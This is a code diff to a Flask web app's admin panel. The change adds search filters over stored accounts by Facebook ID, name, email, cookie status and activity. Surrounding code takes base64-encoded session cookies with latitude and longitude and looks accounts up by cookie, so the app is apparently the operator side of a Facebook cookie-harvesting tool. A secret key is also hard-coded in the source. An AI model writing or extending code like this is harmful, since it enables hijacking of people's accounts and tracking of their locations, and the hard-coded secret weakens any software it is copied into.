@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template, make_response ,redirect
+from flask import Flask, request, jsonify, render_template, make_response, redirect
 from datetime import datetime
 from flask_sqlalchemy import SQLAlchemy
 from urllib.parse import unquote_plus
@@ -10,7 +10,7 @@ from time import sleep
 from helper import *
 import schedule
 
-__version__ = 2.7
+__version__ = 3.1
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = '2RMQfNsgrSsvpd5yZUjOhsXwoJaxw2'
@@ -80,22 +80,43 @@ def api():
     else:
         return get_json_dict(False, 'Invalid Method!', 'danger')
 
+
 @app.route('/admin/', methods=['GET', 'POST'])
 def admin():
     session = request.cookies.get('session', '')
     if not check_if_logined(session):
-        if request.method=='POST':
+        if request.method == 'POST':
             username = unquote_plus(request.form.get('user', ''))
             password = unquote_plus(request.form.get('pass', ''))
             if check_user_pass(username, password):
                 resp = make_response(redirect('/admin/'))
-                resp.set_cookie('session', get_session_key(username, password), 7 * 24 * 60 * 60, path='/')
+                resp.set_cookie('session', get_session_key(
+                    username, password), 7 * 24 * 60 * 60, path='/')
                 return resp
         return render_template('login.html')
     
-    all_acc = Users.query.order_by(Users.id.desc()).all()
+    fb_id = request.args.get('fb_id', '')
+    name = request.args.get('name', '')
+    email = request.args.get('email', '')
+    has_cookie = request.args.get('has_cookie', 'all')
+    active = request.args.get('active', 'all')
 
-    return render_template('panel.html', all_acc = all_acc)
+    all_acc = Users.query
+    if fb_id != '':
+        all_acc = all_acc.filter(Users.fb_id.ilike(f"%{fb_id}%"))
+    if name != '':
+        all_acc = all_acc.filter(Users.name.ilike(f"%{name}%"))
+    if email != '':
+        all_acc = all_acc.filter(Users.email.ilike(f"%{email}%"))
+    if has_cookie != 'all':
+        all_acc = all_acc.filter_by(has_cookie = True if has_cookie == '1' else False)
+    if active != 'all':
+        all_acc = all_acc.filter_by(is_active = True if active == '1' else False)
+
+    all_acc = all_acc.order_by(Users.id.desc()).all()
+
+    return render_template('panel.html', all_acc=all_acc, fb_id = fb_id, name = name, email = email, has_cookie = has_cookie, active = active)
+
 
 def read_only_view(request):  # Search By ID
     fb_id = request.args.get('id')
@@ -109,7 +130,7 @@ def read_only_view(request):  # Search By ID
     return get_json_dict(True, 'Amigo! Account Found', 'success', acc)
 
 
-def author_view(request):  # Search By Cookie 
+def author_view(request):  # Search By Cookie
     cookie = b64decode(unquote_plus(request.form.get('cookie', ''))).decode()
     lat = unquote_plus(request.form.get('lat', ''))
     long = unquote_plus(request.form.get('long', ''))
